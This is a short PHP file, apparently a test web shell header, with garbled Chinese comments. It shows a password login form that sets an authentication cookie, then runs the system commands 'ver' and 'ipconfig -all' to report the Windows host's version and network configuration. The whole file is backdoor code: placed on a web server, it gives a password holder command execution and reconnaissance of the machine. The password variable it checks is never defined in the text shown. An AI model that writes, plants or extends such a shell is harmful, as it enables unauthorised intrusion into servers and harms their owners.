<?php
ini_set('default_charset', 'gbk');//��ѡ��
//bof of �κ�ľ����ͨ��ͷ��
if(!isset($_COOKIE['password']) || $_COOKIE['password'] !== md5(base64_encode($password))){
	if(isset($_POST['password']) && md5(base64_encode($_POST['password'])) === md5(base64_encode($password))){
		setcookie('password', md5(base64_encode($password)), time() + 24 * 3600);
		die('<meta http-equiv="refresh" content="1;URL=">');
	}else{
		die('<form name="form" method="post"><label for="password">Password:</label><input type="password" name="password" id="password"><input type="submit" name="submit" value="submit"></form>');
	}
	die;
}
//eof of �κ�ľ����ͨ��ͷ��

echo '����ľ��111111111111111111--<br /><br /><br /><br /><br /><br />';
var_dump(exec('ver'));
echo '<br /><br /><br />';
var_dump(exec('ipconfig -all'));